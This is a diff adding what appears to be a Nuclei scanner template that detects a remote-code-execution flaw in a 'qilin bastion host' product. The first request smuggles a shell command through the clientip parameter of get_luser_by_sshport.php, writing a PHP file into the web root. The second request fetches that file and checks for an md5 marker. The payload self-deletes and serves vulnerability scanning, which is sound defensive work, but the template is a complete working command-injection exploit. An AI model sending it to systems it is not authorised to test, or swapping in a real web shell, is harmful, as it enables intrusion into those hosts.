@@ -1,0 +1,29 @@
+id: qilin-bastion-host-rce
+
+info:
+    name: qilin bastion host rce
+    author: For3stCo1d (https://github.com/For3stCo1d)
+    severity: high
+    
+variables:
+  filename: "{{rand_base(6)}}"
+  
+http:
+  - raw:
+      - |-
+        GET /get_luser_by_sshport.php?clientip=1;echo%20"<?php%20echo%20md5(1);unlink(__FILE__);?>">/opt/freesvr/web/htdocs/freesvr/audit/{{filename}}.php;&clientport=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+      - |-
+        GET /{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
